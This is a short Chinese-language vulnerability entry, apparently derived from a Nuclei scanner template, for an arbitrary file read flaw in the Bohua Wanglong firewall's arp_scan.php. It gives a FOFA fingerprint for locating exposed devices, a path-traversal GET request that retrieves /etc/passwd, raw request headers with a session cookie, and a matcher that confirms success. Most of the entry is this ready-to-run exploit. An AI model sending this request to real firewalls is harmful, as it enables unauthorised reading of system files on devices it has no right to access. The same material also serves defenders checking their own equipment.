# 博华网龙防火墙系统arp_scan文件读取漏洞

- **系统**：博华网龙防火墙系统arp_scan　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="博华网龙"`
- **请求**：`GET /firewall/arp_scan.php?ifname=/../../../../../etc/passwd HTTP/1.1`
- **关键头**：`id: bhwl-fw-arp_scan-fileread`　`name: bhwl-fw-arp_scan-fileread`　`author: qq`　`severity: critical`　`description: bhwl-fw-arp_scan-fileread`　`fofa-query: title="博华网龙"`　`verified: true`　`max-request: 1`

**请求体 / payload**
```
- raw:
-
Host: {{Hostname}}
Cookie: PHPSESSID=nh7u6p9q1ai8qgkn6q1977std7
Sec-Fetch-User: ?1
Priority: u=0, i
matchers:
- type: dsl
dsl:
- "status_code == 200 && contains(body, '/usr')"
```
- **预期**：200　|　—